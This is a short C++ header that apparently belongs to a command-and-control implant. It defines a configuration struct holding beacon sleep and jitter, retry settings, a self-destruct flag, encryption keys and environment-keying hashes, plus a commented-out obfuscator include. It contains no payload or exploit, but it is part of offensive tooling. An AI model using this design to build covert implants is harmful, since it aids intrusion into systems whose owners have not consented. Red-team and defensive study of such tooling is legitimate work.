#pragma once
#ifndef PROFILE_H
#define PROFILE_H

#include <string>
#include <vector>
#include <windows.h>
#include "./rapidjson/document.h"
//#include "./obfuscator/MetaString.h"

typedef struct {
	std::string implantId;
	std::string cookie;
	std::string userAgent;
	//std::string encoding;
	INT sleep;
	FLOAT jitter;
	INT maxRetries;
	BOOL autoSelfDestruct;
	INT retryWait;
	FLOAT retryJitter;
	INT tailoringHashRounds;
	std::string base64EncryptionKey;
	std::string base64ServerPublicKey;
	std::string tailoringHashFunction;
	std::vector<std::string> tailoringHashes;
} MalleableProfile;

/**
 * Function used to convert a rapidjson Document to a MalleableConfig struct
*/
MalleableProfile* parseMalleableConfig(std::string configString, std::string b64PrivateKey);

#endif
